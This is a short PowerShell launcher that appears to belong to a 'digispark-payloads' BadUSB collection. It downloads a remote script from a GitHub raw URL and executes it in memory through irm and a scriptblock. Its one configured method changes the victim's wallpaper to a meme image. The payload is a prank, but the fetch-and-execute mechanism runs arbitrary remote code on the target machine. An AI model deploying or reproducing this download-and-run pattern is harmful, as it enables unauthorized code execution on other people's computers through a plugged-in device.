param(
    [ValidateSet(0,1)]
    [int]$Method = 0
)

$repoBase = "https://raw.githubusercontent.com/phoenixthrush/digispark-payloads/refs/heads/main"

$methods = @{
    1 = @{
        Script = "$repoBase/methods/change_wallpaper.ps1"
        Args   = @(
            "$repoBase/assets/images/chungus.jpeg"
        )
    }
}

if ($methods.ContainsKey($Method)) {
    $config = $methods[$Method]
    & ([scriptblock]::Create((irm $config.Script))) @($config.Args)
}